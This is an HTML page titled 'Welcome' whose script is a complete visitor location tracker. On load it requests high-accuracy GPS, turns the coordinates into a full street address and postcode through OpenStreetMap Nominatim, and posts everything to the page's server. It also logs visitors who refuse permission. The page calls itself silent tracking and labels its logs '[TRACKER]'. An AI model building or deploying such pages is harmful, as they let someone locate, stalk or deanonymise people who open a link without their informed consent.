<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0d0d0d; color: #eee;
      display: flex; align-items: center; justify-content: center;
      height: 100vh; padding: 20px;
    }
    .box { text-align:center; max-width:420px; width:100%; }
    h1   { font-size:28px; margin-bottom:8px; }
    .sub { color:#888; font-size:15px; }
    #status { font-size:12px; color:#444; margin-top:14px; min-height:18px; line-height:1.6; }
    #status.ok  { color:#00c853; }
    #status.err { color:#ff5555; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Welcome ðŸ‘‹</h1>
    <p class="sub">This page is being tracked silently.</p>
    <p id="status"></p>
  </div>

  <script>
    function log(msg, cls) {
      var el = document.getElementById('status');
      el.textContent = msg;
      el.className = cls || '';
      console.log('[TRACKER]', msg);
    }

    function postLocation(data) {
      console.log('[TRACKER] Posting to server:', JSON.stringify(data));
      fetch('/api/update-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(function(r) { return r.json(); })
      .then(function(d) { console.log('[TRACKER] Server response:', JSON.stringify(d)); })
      .catch(function(e) { console.log('[TRACKER] POST error:', e.message); });
    }

    // OpenStreetMap Nominatim â€” free, no API key, no restrictions
    // Same service used by millions of apps worldwide
    async function reverseGeocode(lat, lon) {
      try {
        var url = 'https://nominatim.openstreetmap.org/reverse' +
                  '?lat=' + lat + '&lon=' + lon +
                  '&format=json&addressdetails=1';
        var r = await fetch(url, {
          headers: { 'Accept-Language': 'en', 'User-Agent': 'LocationTracker/1.0' }
        });
        var d = await r.json();
        console.log('[TRACKER] Nominatim raw:', JSON.stringify(d).substring(0, 300));

        if (!d || !d.address) return null;

        var a = d.address;
        return {
          // Nominatim has many possible city fields â€” try all of them
          city:        a.city || a.town || a.village || a.suburb ||
                       a.county || a.state_district || '',
          region:      a.state || '',
          country:     a.country || '',
          countryCode: (a.country_code || '').toUpperCase(),
          zip:         a.postcode || '',
          fullAddress: d.display_name || ''
        };
      } catch(e) {
        console.log('[TRACKER] Nominatim error:', e.message);
        return null;
      }
    }

    if (navigator.geolocation) {
      log('Detecting your location...');

      navigator.geolocation.getCurrentPosition(
        async function(pos) {
          var lat = pos.coords.latitude;
          var lon = pos.coords.longitude;
          var acc = Math.round(pos.coords.accuracy);

          log('GPS fix Â±' + acc + 'm â€” resolving address...');
          console.log('[TRACKER] GPS:', lat, lon, 'Â±' + acc + 'm');

          var geo = await reverseGeocode(lat, lon);
          console.log('[TRACKER] Geocoded:', JSON.stringify(geo));

          if (geo && (geo.city || geo.region)) {
            log('âœ… ' + geo.city + ', ' + geo.region + ', ' + geo.country, 'ok');
            postLocation({
              lat:         lat,
              lon:         lon,
              city:        geo.city,
              region:      geo.region,
              country:     geo.country,
              countryCode: geo.countryCode,
              zip:         geo.zip,
              fullAddress: geo.fullAddress,
              lookupSource: 'nominatimGPS'
            });
          } else {
            log('Got coordinates â€” saving position', 'ok');
            postLocation({ lat: lat, lon: lon, lookupSource: 'gpsOnly' });
          }
        },

        function(err) {
          var msgs = { 1: 'Permission denied', 2: 'Position unavailable', 3: 'Timed out' };
          log(msgs[err.code] || err.message, 'err');
          console.log('[TRACKER] GPS error code:', err.code);
          postLocation({ lookupSource: 'gpsDenied' });
        },

        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    } else {
      log('GPS not supported by this browser', 'err');
      postLocation({ lookupSource: 'unsupported' });
    }
  </script>
</body>
</html>
